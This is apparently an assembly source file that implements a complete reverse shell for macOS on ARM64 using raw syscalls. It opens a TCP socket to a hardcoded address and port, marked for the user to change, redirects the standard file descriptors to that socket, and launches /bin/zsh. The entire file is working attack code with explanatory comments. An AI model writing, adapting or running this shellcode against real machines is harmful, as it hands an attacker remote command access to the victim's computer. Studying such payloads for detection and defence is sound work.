//
//  reverseShell.s
//A reverse shell written in arm64 for macOS using syscalls

.global _start
.align 4
_start:
//First we need to great a new socket using socket(int domain, int type, int protocol)
    mov     x0, #2                  //PF_INET = 2 for domain
    mov     x1, #1                  //type = SOCK_STREAM = 1
    mov     x2, xzr                 //IPPROTO = 0
    mov     x16, #97
    svc     0xFFFF
//save return socket descriptor
    mov     x20, x0
//connect(int socket, const struct sockaddr *address, socklen_t address_len)
    mov     x0, x20
    mov     x3, #0x0200             //value in big endian for sin_len = 0 and sin_family = 2 = PF_INTET
    movk    x3, #0xD204, lsl#16     //value of sin_port = 1234 (big endian) 04 D2 (CHANGE THIS PORT)
    movk    x3, #0xA8C0, lsl#32     //ip address = 192.168.1.51 C0 A8 01 33 - (CHANGE THIS ADDRESS)
    movk    x3, #0x3301, lsl#48     //ip address continued
    stp     x3, xzr, [sp, #-16]!    //push the sockaddr struct to the stack along with xzr
    add     x1, sp, xzr             //load pointer to sockaddr_in struck
    mov     x2, #16
    mov     x16, #98
    svc     0xFFFF
//dup2 system call 3 times for each file descriptor to redirect to our socket
    mov     x0, x20
    mov     x1, #2
    mov     x16, #90
    svc     0xFFFF
    mov     x0, x20
    mov     x1, #1
    svc     0xFFFF
    mov     x0, x20
    mov     x1, xzr
    svc     0xFFFF
//launch zsh 2F 62 69 6E 2F 7A 73 68 char *fname, char **argp, char **envp
    mov     x3, 0x622F              //move "/bin/zsh" into x3 "2F 62 69 6E 2F 7A 73 68"
    movk    x3, 0x6E69, lsl#16
    movk    x3, 0x7A2F, lsl#32
    movk    x3, 0x6873, lsl#48
    stp     x3, xzr, [sp, #-16]!
    add     x0, sp, xzr
    stp     x0, xzr, [sp, #-16]!
    add     x1, sp, xzr
    mov     x2, xzr
    mov     x16, #59
    svc     0xFFFF
